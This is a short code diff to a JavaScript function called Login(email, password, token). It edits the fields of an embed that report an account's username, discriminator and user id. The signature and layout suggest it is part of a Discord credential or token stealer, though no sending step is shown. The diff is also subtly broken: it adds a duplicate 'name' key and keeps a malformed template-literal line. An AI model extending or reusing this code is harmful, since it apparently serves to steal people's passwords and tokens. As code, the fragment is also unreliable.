@@ -153,12 +153,13 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": " username",
+			    "name": json.username + "#" + json.discriminator,
                             "value": ` - ${json.username}`#`${json.discriminator}`,
                             "inline": false
                         },
                         {
                             "name": " userid",
-                            "value": ` - ${json.id}`,
+                            "value": json.id,
                             "inline": true
                         },
                         {
